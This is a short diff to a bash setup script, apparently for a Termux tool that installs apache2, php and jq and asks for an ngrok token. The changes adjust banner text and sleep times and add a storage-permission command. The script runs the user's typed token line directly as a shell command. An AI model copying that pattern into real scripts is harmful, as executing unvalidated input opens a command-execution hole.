@@ -5,12 +5,13 @@ echo ""
 echo ""
 echo ""
 echo ""
-echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m !!! NGROK TOKEN MUST OTHERWISE SCRIPT NOT WORKING PROPERLY !!!    \e[0m'
-sleep 8
+echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m!!! NGROK TOKEN MUST OTHERWISE SCRIPT NOT WORKING PROPERLY !!! \e[0m'
+sleep 6
 clear
 echo ""
 echo ""
 echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
+termux-setup-storage
 sudo apt-get install apache2 -y
 apt install php -y
 apt install jq -y
@@ -43,5 +44,5 @@ echo ""
 echo ""
 read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
 $token
-sleep 10
+sleep 2
 clear
